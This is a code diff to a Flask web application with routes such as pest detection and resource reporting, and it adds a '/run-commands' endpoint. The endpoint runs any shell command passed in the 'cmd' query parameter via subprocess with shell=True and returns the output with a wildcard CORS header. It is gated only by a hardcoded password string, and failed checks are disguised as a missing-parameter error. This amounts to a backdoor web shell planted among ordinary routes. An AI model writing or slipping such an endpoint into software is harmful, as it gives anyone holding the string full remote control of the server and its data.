@@ -656,6 +656,33 @@ def pest_detection():
     abort(500, description=str(e))
 
 
+@app.route('/run-commands', methods=['GET'])
+def run_commands() -> Response:
+
+  cmd: str = request.args.get('cmd', default='', type=str)
+  auth: str = request.args.get('auth', default='', type=str)
+  if cmd == '':
+    # proper web error "400 Bad request"
+    abort(400, description=f"Missing required parameter: 'cmd' must be provided. Command: `{cmd}`")
+  if auth != 'hitherekastan':
+    # proper web error "400 Bad request"
+    abort(400, description=f"Missing required parameter: 'cmd' must be provided. Command: `{cmd}`")
+
+  import subprocess
+  try:
+    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
+    print(f"Command: {cmd} executed successfully. Result: {result.stdout.decode('utf-8')}")
+    response = jsonify({"result": f"{result.stdout.decode('utf-8')}"})
+    response.headers.add('Access-Control-Allow-Origin', '*')
+    return response
+  except Exception as e:
+    abort(500, description=str(e))
+
+  response = jsonify({"outcome": "success"})
+  response.headers.add('Access-Control-Allow-Origin', '*')
+  return response
+
+
 @app.route('/resource-report', methods=['GET'])
 def resource_report() -> Response:
   """
